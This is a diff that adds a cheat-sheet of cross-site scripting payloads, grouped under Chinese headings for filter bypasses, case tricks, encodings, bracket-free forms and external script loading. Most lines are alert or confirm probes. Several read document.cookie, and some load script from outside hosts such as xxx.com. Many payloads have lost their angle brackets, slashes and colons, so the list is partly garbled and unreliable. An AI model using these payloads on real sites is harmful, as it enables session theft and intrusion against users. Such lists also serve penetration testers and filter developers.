@@ -1,0 +1,108 @@
+
+
+============  没有   尖括号   也可无 斜杠
+onload=eval(ale.source rt.source (111111).source)
+2onmouseover=alert(document.cookie)
+2onmouseover=alert('1')
+'onmouseover='alert(1)
+
+
+==========   特殊符号    !--  %0A 换行符 --
+html%0Aonpointerenter%0A=%0A[domain].find(confirm)
+HtmL+OnPoiNTERENter%09=%09confirm(domain)
+
+
+====================    常用 XSS Payload
+1h2zxh2iframe2
+scriptalert(document.cookie)script
+1iframe src=javascriptalert(1)iframe2
+svgonload=alert(1)
+1iframe src=javascriptalert(document.cookie)iframe2
+1img src= onerror=alert(document.cookie)3
+svg onload=prompt(1)
+0img src= onerror=alert('xss')9
+1h212svgonload=alert(1)
+1BODY onload=alert(1)2
+1a href=httpswww.baidu.com123a2
+embedsrc=goo.glnlX0Pinput onfocus=confirm`` autofocusembed
+svg onload=confirm(1)
+svgonload=prompt(1)
+1svg onload=confirm(1)2
+2svgsvg onload=confirm(document.cookie)3 
+img src=x onerror=prompt(domain)
+img src= onerror=alert('xss')
+scriptalert('xss')script
+SCRIPTALERT('XSS')SCRIPT
+textareaimg src= onerror=alert(document.cookie)3
+img src= onerror=alert('xss')
+h23svg onload=confirm(1)h2
+scriptshowError('2')script
+input typr=file img src=xxinput type=file id=input
+spanatdconfirm(xss)tdh22h2
+59507;alert(1)276
+scriptconfirm(document.domain)script
+table background=javascriptalert(1)table
+iframe src=httpftpaoe.ftp69.host-ftp.win1.html
+1object data=datatexthtml;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==object2
+'';!--XSS=&{()}
+'';!--scriptalert(0);script=&{()}
+'';!--scriptalert(0);script=&{(alert(1))}
+scriptalert(0)script
+SCRIPTsalert(String.from+CharCode(88, 83, 83))script
+scriPTconsole.log(0);sCRIpt
+scriptonreadystatechange=alert(1)
+img src=--img src=x onerror=alert(1)
+object data=datatexthtml;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==object
+Set.constructor`alertx28document.domainx29```
+TITLESCRIPTalert(Vulnerable!);SCRIPT
+a href=javascriptalert(1)mea
+a href=&#x6A;avascriptalert(1)mea
+&#x22;alert('1')20%onmouseover&#x3D;&#x22;alert('1')
+2&#x22;onmouseover&#x3D;&#x22;alert('1')
+1&quot;&gt;&lt;BODY onload=&quot;alert(1)&quot;&gt;&lt;&quot;2
+
+
+==========大小写绕过
+
+Svg ONLOAD=confirm(1)
+
+
+
+==========在script 标签里面
+
+test;alert(document.cookie)
+
+==========  a标签
+a href=httpswww.baidu.com onclick=javascriptalert(1) baidua
+a href=javascriptalert(1)mea
+
+
+
+==========  无括号
+1scriptonerror=alert;throw document.cookiescript2
+1scriptonerror=alert;throw document.cookiescript2
+
+
+==========   编码
+u003Cscriptu003Ealertu00281u0029u003Cscriptu003E
+!-- unicode编码    scriptalert(1)script  --
+u003Cscriptu003Eu003Cscriptu003Ealertu00281u0029u003Cscriptu003E
+
+
+
+
+==========   标准的javascript代码
+
+script type=textjavascript
+top.location.href = 'httpswww.baidu.com';
+script
+
+
+
+
+
+
+==========   调用外部JS
+
+script src=httpxxx.comxssjs1.js
+iframe src=httpxxx.com
